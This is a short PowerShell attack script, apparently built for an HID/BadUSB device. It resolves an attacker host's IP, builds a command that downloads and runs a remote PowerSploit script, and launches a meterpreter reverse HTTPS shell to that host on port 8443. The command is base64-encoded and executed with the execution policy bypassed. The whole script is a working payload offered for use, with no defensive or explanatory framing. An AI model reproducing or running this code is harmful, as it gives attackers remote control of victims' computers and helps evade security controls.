$Tablet = "BurnD-Sero"
$Computer = "BurnD-Machine2"
try {
    $DevIP = [System.Net.Dns]::GetHostAddresses($Computer) | ? {$_.AddressFamily -eq 'InterNetwork'} | select -expand IPAddressToString
    }
catch {
    try {
        $DevIP = [System.Net.Dns]::GetHostAddresses($Tablet) | ? {$_.AddressFamily -eq 'InterNetwork'} | select -expand IPAddressToString
        }
    catch {
        EXIT
        }
    }
$url = '"https://github.com/Burnd9671/HID-Powersploit/raw/master/var/www/html/Invoke-Powersploit"'
$rawcmd = "iex (New-Object Net.WebClient).DownloadString($url); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $DevIP -Lport 8443 -Force"
Echo $rawcmd > "C:\Users\Bryan Louiselle\Desktop\Raw_Command.txt"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawcmd)
$obfscmd = [Convert]::ToBase64String($bytes)
Powershell.exe -Exec Bypass -Nol -Enc $obfscmd
